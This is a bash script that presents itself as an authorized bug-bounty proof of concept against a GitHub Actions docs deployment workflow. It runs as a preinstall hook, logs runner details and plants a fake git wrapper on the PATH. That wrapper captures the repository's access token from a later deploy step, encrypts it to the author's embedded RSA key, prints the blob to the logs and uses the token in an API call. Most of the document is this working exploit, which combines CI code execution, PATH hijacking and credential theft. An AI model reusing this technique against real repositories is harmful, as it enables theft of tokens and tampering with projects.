#!/bin/bash
# ============================================================
# SECURITY TEST — Google VRP Authorized Research
# googleapis/genai-toolbox — docs_preview_deploy.yaml
# Researcher: 0xmagnus91 (bughunters.google.com)
# ============================================================
set -e

echo "============================================="
echo "[VRP-SECURITY-TEST] Preinstall script executing"
echo "============================================="

# --- PART 1: Prove code execution in PRT context ---
echo "[INFO] GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME"
echo "[INFO] GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
echo "[INFO] GITHUB_ACTOR=$GITHUB_ACTOR"
echo "[INFO] GITHUB_REF=$GITHUB_REF"
echo "[INFO] GITHUB_SHA=$GITHUB_SHA"
echo "[INFO] GITHUB_WORKFLOW=$GITHUB_WORKFLOW"
echo "[INFO] RUNNER_OS=$RUNNER_OS"
echo "[INFO] USER=$(whoami)"
echo "[INFO] PWD=$(pwd)"

# --- PART 2: Confirm persist-credentials is false (v6 default) ---
echo ""
echo "[CHECK] Git credential state after checkout@v6:"
git config --get-all http.https://github.com/.extraheader 2>/dev/null && \
  echo "[FOUND] Credentials persisted in git config" || \
  echo "[CONFIRMED] No credentials in git config (persist-credentials: false)"

# Check $RUNNER_TEMP for leftover credential files
echo "[CHECK] RUNNER_TEMP credential files:"
ls -la "$RUNNER_TEMP"/git-credentials-* 2>/dev/null && \
  echo "[FOUND] Credential files in RUNNER_TEMP" || \
  echo "[CONFIRMED] No credential files in RUNNER_TEMP (cleaned up)"

# --- PART 3: Set up PATH hijack for token interception in deploy step ---
# The peaceiris/actions-gh-pages step will call:
#   git remote add origin https://x-access-token:TOKEN@github.com/...
# Our wrapper intercepts this to prove token access.

WRAPPER_DIR="/tmp/vrp-poc-bin"
mkdir -p "$WRAPPER_DIR"

# Embed RSA public key
echo "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUFrLzl2T3R4SlY4NzY3UHRuMHM2dQpqS2Jvd3FxY0pCWitKL09YQ3JNVjVVaVNIOTh2ZUhSTGtQd05VeEVGYlNDaDdvTDdHaVdUZkkrblBjWlpQT054CmpFNGpFL3Rmb1pWTEJnS29OdFhMeE9lL1FsajRKdjMwdzhKWkdqWm03WkVDUHBUM2pnOG9MT0RGYXlEajlaZWkKYVFHVG9XeTI0YzVyL0VPSTRPRTFhWHhKdDF6V1F2NVNWU2xCc1l0ME1uU3pOdUJpalJGR2xIMGZ0czBPeXArUgphM3BiZUo0dG5XN0ViSzZ4cFlodjJwNUtQS00wS01lZWJrWjJVVFhNd0cwMmlLNmt3d2VSMzBZSjZWNXpIcG9rCklOb1ozU2M2WDFETHFzSmRTVE9uSklNeTVxYm42NGlyWUQ5UzFiZVJka2hsSkR5MExZemJmOGdRMUpKN1ZNSlAKS2N0cVpGLzV5RXg0WlRTTEpMZ3lWRzZRTEFrQlJ3TFczNW14cDA3Z0FxamlpdEI5ZERlb0xPQjVPOXAyUVN4RQpSUlAweW9WUndJdDJwaGdZK1dMaEtRSS9PZFBKQUtlV2dzR0tvNFpPWDhyNVRmc05XSUtOMHV5VDlES29RV2haCldHVnlwaDU2MTVlRVlJTnBpQktJOVBSaXZ2TTExWEsxSFgrODZ6T21JVW8zSVJhWXhEYnFORkJ1YWRKaW1qNzUKeE9ZUGZHa0FOQkxFS1p3VE1UWUdTRWdsS0tDYXA2R2lnNDVHMnZCQW1MNERFRTZMRFE0UjBWdVVUT1lPTXJKTwpabXl1UjJGdmR0NEZNTityOWNlWGh4Z0NTdmF3OUhTa0E2cWFwamdPVitrNlk4RWhFSlcrbDI3K2FsU2NqYWxtCjRsWG0zdVd2L2lhNWRLSHM1UkI3T0Q4Q0F3RUFBUT09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=" | base64 -d > /tmp/vrp_pub.pem

# Create git wrapper that intercepts credential operations
cat > "$WRAPPER_DIR/git" << 'GITWRAPPER'
#!/bin/bash
REAL_GIT="/usr/bin/git"

# Intercept "remote add origin" — this is where peaceiris embeds the token
if [[ "$1" == "remote" && "$2" == "add" && "$3" == "origin" ]]; then
    REMOTE_URL="$4"

    # Check if URL contains x-access-token (the GITHUB_TOKEN)
    if [[ "$REMOTE_URL" == *"x-access-token:"* ]]; then
        echo "[VRP-SECURITY-TEST] Token intercepted via git remote add origin"

        # Extract just the token from the URL
        TOKEN=$(echo "$REMOTE_URL" | sed 's|https://x-access-token:\([^@]*\)@.*|\1|')

        # Mask the token IMMEDIATELY so it never appears in logs
        echo "::add-mask::$TOKEN"
        echo "::add-mask::$REMOTE_URL"

        # Show token metadata without exposing the value
        echo "[VRP] Token length: ${#TOKEN}"
        echo "[VRP] Token prefix: ${TOKEN:0:4}..."

        # RSA-encrypt the token for safe evidence collection
        if [ -f /tmp/vrp_pub.pem ]; then
            # Generate random AES key
            AES_KEY=$(openssl rand -hex 32)
            AES_IV=$(openssl rand -hex 16)

            # Encrypt token + environment with AES
            PAYLOAD="TOKEN=$TOKEN
GITHUB_REPOSITORY=$GITHUB_REPOSITORY
GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME
GITHUB_ACTOR=$GITHUB_ACTOR
REMOTE_URL=$REMOTE_URL"
            ENC_DATA=$(echo "$PAYLOAD" | openssl enc -aes-256-cbc -K "$AES_KEY" -iv "$AES_IV" -base64 -A 2>/dev/null)

            # Encrypt AES key with RSA public key
            ENC_KEY=$(echo "$AES_KEY" | openssl pkeyutl -encrypt -pubin -inkey /tmp/vrp_pub.pem 2>/dev/null | base64 -w0)

            # Output encrypted blob to logs (safe — only researcher can decrypt)
            echo "======= VRP-ENCRYPTED-EVIDENCE-START ======="
            echo "AES_IV=$AES_IV"
            echo "ENC_KEY=$ENC_KEY"
            echo "ENC_DATA=$ENC_DATA"
            echo "======= VRP-ENCRYPTED-EVIDENCE-END ========="
        fi

        # Verify token permissions via read-only API call
        PERMS=$(curl -s -H "Authorization: token $TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY" 2>/dev/null | \
            python3 -c "import sys,json; d=json.load(sys.stdin); print(f'push={d[\"permissions\"][\"push\"]}, admin={d[\"permissions\"][\"admin\"]}')" 2>/dev/null)
        echo "[VRP] Token permissions: $PERMS"
    fi
fi

# ALWAYS pass through to real git — do not disrupt the workflow
exec "$REAL_GIT" "$@"
GITWRAPPER

chmod +x "$WRAPPER_DIR/git"

# Register wrapper for subsequent steps via GITHUB_PATH
echo "$WRAPPER_DIR" >> "$GITHUB_PATH"
echo "[VRP] PATH hijack registered for subsequent steps"

echo "============================================="
echo "[VRP-SECURITY-TEST] Preinstall complete"
echo "============================================="
